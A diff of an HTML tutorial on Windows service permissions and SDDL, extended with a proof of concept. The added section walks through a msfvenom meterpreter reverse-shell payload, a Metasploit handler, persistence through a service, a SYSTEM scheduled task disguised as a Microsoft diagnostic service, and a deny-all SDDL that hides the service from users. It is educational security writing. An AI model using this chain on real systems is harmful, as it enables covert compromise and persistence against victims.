@@ -75,6 +75,8 @@
                         </p>  
                         <h4 class="mb-0">Windows Services</h4>
                         <p>
+                            Most of the Windows services can be found just by researching on your Windows search bar "Services".
+                            <img src="img/SDDL/services.jpg" class="img-fluid" width="700">
                             Creating a service in Windows can be done by using the command <strong>sc.exe</strong>
                             <div class="squarebox">sc.exe create mysvc displayname=”myservice” binpath=”C:\Users\Hakkyahud\Desktop\work.exe”</div>
                             <img src="img/SDDL/createservice.jpg" class="img-fluid" width="700">
@@ -93,11 +95,11 @@
                             <img src="img/SDDL/listservicexbl.jpg" class="img-fluid" width="500">
                             To start a service:
                             <div class="squarebox">sc start [ServiceName]</div>
-                            <img src="img/SDDL/runservice.jpg" class="img-fluid" width="500">
+                            <img src="img/SDDL/runservice.jpg" class="img-fluid" width="400">
                             The service cannot be run by a normal user, how can we give the right to the user ?
                             First let's check the SDDL of the service to understand more closely what permission it has.
                             <div class="squarebox">sc sdshow [ServiceName]</div>
-                            <img src="img/SDDL/sdshow.jpg" class="img-fluid" width="700">
+                            <img src="img/SDDL/sdshow.jpg" class="img-fluid" width="800">
                             D: indicate the DACL, followed by several ACEs and the S: indicate the SACL. <br>
                             We will focus on the DACL part, the format of an ACE is: <strong>(ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid)</strong> <br>
                             Let’s take the first ACE: <strong>(A;;CCLCSWRPWPDTLOCRRC;;;SY)</strong> <br>
@@ -127,9 +129,9 @@
                             So the ACE indicates that it allows the user NT AUTHORITY\SYSTEM to almost every right on the service. Among the access control entries, there isn't any indicating that a specific user can start a service.
                             <br>
                             If we want to give the permission to start the service to a user, we must retrieve his SID.
-                            <img src="img/SDDL/sid.jpg" class="img-fluid" width="700">
+                            <img src="img/SDDL/sid.jpg" class="img-fluid" width="800">
                             Let’s add the following SDDL to give the permission to start and stop a service (A;;WPRP;;; S-1-5-21-320533732-2754806046-4003924088-1001).
-                            <img src="img/SDDL/sdset.jpg" class="img-fluid" width="700">
+                            <img src="img/SDDL/sdset.jpg" class="img-fluid" width="800">
                             After adding the new access control entry, the user can start and stop the service.
                             <img src="img/SDDL/startservice.jpg" class="img-fluid" width="700">
                         </p>
@@ -155,7 +157,61 @@
                             We allow to start the service by the SYSTEM, so that we can set a schedule task to run the service everytime that a user is logging in the system for example.
                             <br>
                             <br>
-                            An attacker that has compromised an account with some administrative rights can easily hide a service from the victim. We will see in another article, how to catch and detect this kind of behavior.
+                            An attacker that has compromised an account with some administrative rights can easily hide a service from the victim. 
+
+                            Let's do something more practical to see what a malevolent administrator or an attacker that has administrator privileges can do. For the following POC, I have to disable any host-based detection system, because metasploit is easily flagged by them. <br>
+                            <br>
+                            <h4>Creating a malicious service</h4>
+                            First, we need a malicious payload. To generate one, use <strong>msfvenom</strong>.
+                            <div class="squarebox">msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.80.134 lport=4444 ploit.exe</div>
+                            <img src="img/SDDL/msfvenom.jpg" class="img-fluid" width="800">
+                            Then host the payload on a python HTTP server. The payload has to be stored on the directory that you have started your python server, in my case <strong>/root/http</strong>
+                            <div class="squarebox">python3 -m http.server 8000</div>
+                            <img src="img/SDDL/pythonserver.jpg" class="img-fluid" width="800">
+                            Start Metasploit and configure it to listen on the port 4444.
+                            <div class="squarebox">
+                                msfconsole <br>
+                                use multi/handler <br>
+                                set PAYLOAD windows/x64/meterpreter/reverse_tcp <i style="color: green;">Make sure the payload is similar as the one generate by msfvenom.</i><br>
+                                set LHOST 192.168.80.134 <i style="color:green;">Your own IP address</i><br>
+                                set LPORT 4444 <br>
+                                exploit
+                            </div>
+                            The configuration of metasploit must contained the same information that you have set when you have generated the payload with msfvenom.
+                            <img src="img/SDDL/meterpreter.jpg" class="img-fluid" width="800">
+                            Now that we have compromised the system, let's move on the persistence. For our case, we will create a service and a schedule task.
+                            Exit the interactive session without killing the session by typing <strong>background</strong>.
+                            <img src="img/SDDL/background.jpg" class="img-fluid" width="900">
+                            Create a service with Metasploit :
+                            <div class="squarebox">
+                                use post/windows/manage/persistence_exe <br>
+                                set SESSION 5 <i style="color: green;">Check the session ID when your have typed background</i> <br>
+                                set STARTUP SERVICE <br>
+                                set LOCALEXEPATH C:\\temp <br>
+                                run 
+                            </div>
+                            <img src="img/SDDL/persistenceservice.jpg" class="img-fluid" width="900">
+                            The service created on the Windows system is called swHrOyUa. <br>
+                            To return back to the meterpreter interactive session :
+                            <div class="squarebox"> sessions -i [ID]</div>
+                            We will check our installed service, open cmd from meterpreter.
+                            <div class="squarebox">execute -f cmd.exe -i -H <i style="color:green;">The parameter H is to hide the cmd window</i></div>
+                            <img src="img/SDDL/cmd.jpg" class="img-fluid" width="700">
+                            We create a scheduled task for the persistence that starts the service when any user is loging in the system. <br>
+                            Using PowerShell : 
+                            <div class="squarebox">$taskname = “Microsoft\Windows\Diagnosis\WinUserDataSvc”;$description = “Run this service to monitor user actions”;$action = New-ScheduledTaskAction -Execute “cmd.exe” -Argument “/k sc start swHrOyUa” -WorkingDirectory “%windir%\System32”;$trigger = New-ScheduledTaskTrigger -AtLogon;$settings = New-ScheduledTaskSettingsSet;$settings.CimInstanceProperties.Item(‘MultipleInstances’).Value=3;$principal = New-ScheduledTaskPrincipal -UserId “System” -RunLevel “Highest”;Register-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -TaskName $taskname -Description $description -Settings $settings</div>
+                            <img src="img/SDDL/tasksch.jpg" class="img-fluid" width="700">
+                            Let's change the permission of the malicious service, replace the SDDL by <strong>D:(A;;LCRP;;;SY)(D;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)</strong>
+                            <div class="squarebox">sc sdset swHrOyUa "D:(A;;LCRP;;;SY)(D;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"</div>
+                            This will deny all the rights for every user except for the SYSTEM that can run the service because the first DACL has the priority on the second and forth.
+                            <img src="img/SDDL/servicedenied.jpg" class="img-fluid" width="700">
+                            Let's test if this is working. First, shutdown the victim system which will lead to killing our meterpreter session.
+                            Once it is dead, listen again on the port 4444 then start the system and log in with any user. <br>
+                            <img src="img/SDDL/serviceautorun.jpg" class="img-fluid" width="700">
+                            Boom, the service run automatically after any user log in this system and I become SYSTEM :). <br>
+                            <br>
+                            In conclusion, you have seen that manipulating the Security Descriptor Definition Language can restrict many accesses on Windows named objects. For an attacker to accomplish this, he needs to compromise the system and get administrator privilege. For this POC, it is only for education purpose, it will be flagged by any host based detection if you're trying to do it. But for an malevolent administrator that already has elevated privileges, he can easily restrict access to some objects and avoid being caught by modifying the SDDL. <br>
+                            We will see in another article, how to catch and detect this kind of behavior. 
                         </p>
                     </div>
                 </div>
